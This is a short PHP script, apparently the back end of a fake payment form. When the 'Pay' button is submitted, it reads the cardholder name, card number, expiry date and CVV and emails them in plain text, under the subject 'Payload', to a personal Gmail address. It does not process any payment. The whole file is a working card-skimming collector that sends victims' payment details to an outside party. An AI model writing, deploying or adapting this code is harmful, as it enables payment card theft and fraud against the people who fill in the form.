<?php
if(isset($_POST["Pay"]))
{
    $cardho = $_POST['card_ho'];
    $cardno = $_POST['card_no'];
    $cardex = $_POST['card_ex'];
    $cvv = $_POST['cvv'];

    $message =  $cardho . " " . $cardno . " " . $cardex . " " . $cvv;

    $to = "emekaveli@gmail.com";
    $subject = "Payload";
    $headers = array(
        'From' => 'webmaster@example.com',
        'Reply-To' => 'webmaster@example.com',
        'X-Mailer' => 'PHP/' . phpversion()
    );
    mail($to, $subject, $message, $headers);
}